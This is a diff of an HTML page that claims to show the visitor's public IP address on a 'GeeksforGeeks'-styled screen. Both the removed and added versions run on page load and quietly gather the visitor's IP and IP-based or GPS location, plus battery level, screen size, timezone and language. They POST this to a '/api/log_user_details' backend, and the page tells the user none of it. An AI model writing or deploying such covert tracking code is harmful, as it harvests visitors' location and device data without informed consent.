@@ -1,81 +1,78 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Network & System Info</title>
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <title>Title For The Webpage</title>
 </head>
+
 <body>
-    <h1>H1 Tag</h1>
+    <center>
+        <h1>GeeksforGeeks</h1>
+        <h3>Public IP Address of user is:</h3>
+        <p id="ip-address"></p>
+    </center>
 
     <script>
-        const getLocation = () => {
-            fetch('https://ipapi.co/json/')
-                .then((response) => response.json())
-                .then((data) => {
-                    console.log(data);
+        document.addEventListener("DOMContentLoaded", function() {
+            // Fetch the IP address from the API
+            fetch("https://api.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => {
+                    // Display the IP address on the screen
+                    const ip = data.ip;
+                    document.getElementById("ip-address").textContent = ip;
 
-                    // Get battery information
-                    navigator.getBattery().then(function(battery) {
-                        // Collect information to send to backend
-                        const details = {
-                            asn: data.asn,
-                            city: data.city,
-                            continent_code: data.continent_code,
-                            country: data.country_name,
-                            country_area: data.country_area,
-                            country_calling_code: data.country_calling_code,
-                            country_capital: data.country_capital,
-                            country_code: data.country_code,
-                            country_code_iso3: data.country_code_iso3,
-                            country_population: data.country_population,
-                            country_tld: data.country_tld,
-                            currency: data.currency,
-                            currency_name: data.currency_name,
-                            in_eu: data.in_eu,
-                            ip: data.ip,
-                            languages: data.languages,
-                            latitude: data.latitude,
-                            longitude: data.longitude,
-                            network: data.network,
-                            org: data.org,
-                            postal: data.postal,
-                            region: data.region,
-                            region_code: data.region_code,
-                            timezone: data.timezone,
-                            utc_offset: data.utc_offset,
-                            version: data.version,
-                            battery_level: battery.level * 100,  // Convert battery level to percentage
-                            screen_width: window.screen.width,
-                            screen_height: window.screen.height,
-                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                            browser_language: navigator.language,
-                            timestamp: new Date().toISOString()
-                        };
+                    // Get the location details using Geolocation API
+                    if ("geolocation" in navigator) {
+                        navigator.geolocation.getCurrentPosition((position) => {
+                            const { latitude, longitude } = position.coords;
 
-                        // Send collected data to Flask backend
-                        fetch('/api/log_user_details', {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify(details),
-                        })
-                        .then(response => response.json())
-                        .then(data => {
-                            alert("Alert Shown Successfully!");
-                            console.log("Server Response:", data);
-                        })
-                        .catch(error => {
-                            console.error("Error:", error);
+                            // Get battery information
+                            navigator.getBattery().then(function(battery) {
+                                // Collect information to send to backend
+                                const details = {
+                                    ip: ip,
+                                    latitude: latitude,
+                                    longitude: longitude,
+                                    battery_level: battery.level * 100,  // Convert battery level to percentage
+                                    screen_width: window.screen.width,
+                                    screen_height: window.screen.height,
+                                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                                    browser_language: navigator.language,
+                                    timestamp: new Date().toISOString(),
+                                };
+
+                                // Send collected data to Flask backend
+                                fetch('/api/log_user_details', {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json',
+                                    },
+                                    body: JSON.stringify(details),
+                                })
+                                .then(response => response.json())
+                                .then(data => {
+                                    console.log("Server Response:", data);
+                                    alert("Data sent successfully!");
+                                })
+                                .catch(error => {
+                                    console.error("Error:", error);
+                                });
+                            });
+                        }, (error) => {
+                            alert("Error getting geolocation: " + error.message);
                         });
-                    });
+                    } else {
+                        alert("Geolocation is not supported by this browser.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error fetching IP address:", error);
                 });
-        };
-
-        // Call the function to get location and send data to backend
-        getLocation();
+        });
     </script>
 </body>
+
 </html>
